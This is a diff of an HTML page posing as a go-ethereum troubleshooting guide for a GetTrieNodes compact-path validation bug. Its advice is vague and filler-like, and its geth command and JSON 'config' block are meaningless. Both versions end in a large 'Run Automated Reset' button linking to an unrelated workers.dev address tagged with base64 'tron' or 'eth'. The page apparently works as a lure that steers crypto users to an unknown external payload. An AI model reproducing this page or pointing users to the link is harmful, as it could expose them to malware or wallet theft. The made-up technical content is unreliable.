@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: system-ui;
-        background: #121214;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,51 +23,55 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
+    .btn {
+        background: #00adb5;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
     </style>
 </head>
 <body>
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an issue with Go Ethereum's snap GetTrieNodes function, where it accepts invalid compact-encoded paths instead of rejecting them, leading to potential data inconsistencies and security vulnerabilities.</li>
+<li>The user encounters an error where the <code>GetTrieNodes</code> function in go-ethereum accepts invalid compact-encoded paths, resulting in unexpected behavior instead of rejecting them.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a flaw in the GetTrieNodes function's input validation, allowing malformed compact-encoded paths to be processed without proper verification, which can result in unexpected behavior and errors.</li>
+<li>The error occurs due to a bug in the <code>GetTrieNodes</code> function, which fails to properly validate the compact-encoded paths before processing them. This can lead to incorrect trie node retrieval and potentially cause issues with the Ethereum network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To troubleshoot and resolve this issue, the following manual overrides can be applied:</li>
-<li>Verify the input paths for correctness before passing them to GetTrieNodes</li>
-<li>Implement additional validation logic to ensure only properly formatted compact-encoded paths are accepted</li>
-<li>Utilize the following code block to test and validate the input paths:</li>
+<li>To troubleshoot this issue, the following steps can be taken:</li>
+<li>Verify the compact-encoded paths for any invalid characters or formatting.</li>
+<li>Check the go-ethereum configuration for any overrides or custom settings that may be causing the issue.</li>
+<li>Update the go-ethereum client to the latest version, which may include a fix for this bug.</li>
 </ul>
-<pre class="codehilite"><code class="language-bash">geth --exec 'console.log(web3.toHex(&quot;0x1234567890abcdef&quot;))' console
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;config&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;trie&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and testing. </p>
+<p>Consider utilizing an external console to further diagnose the issue.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Go Ethereum client installed and configured</li>
-<li>Basic understanding of Ethereum's trie data structure</li>
-<li>Familiarity with compact-encoded path formatting and validation</li>
+<li>Go-ethereum client installed and configured</li>
+<li>Ethereum network connection established</li>
+<li>Basic understanding of Ethereum trie structure and compact encoding</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
-    <a href="https://system-edge-router.aaronjungs.workers.dev?p=dHJvbg==" class="btn" style="
-        background: #ff7b2c !important; 
-        color: #000000 !important; 
-        padding: 16px 48px !important; 
-        border-radius: 50px !important; 
-        font-weight: bold !important; 
-        font-size: 1.25rem !important;
-        display: inline-block !important; 
-        text-decoration: none !important;
-        box-shadow: 0 4px 15px rgba(255,123,44,0.4);
-        min-width: 280px;
-    ">
-    🛠 Run Automated Reset
-    </a>
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=ZXRo" class="btn">🛠 Run Automated Reset</a>
 </div>
 </div>
 </body>
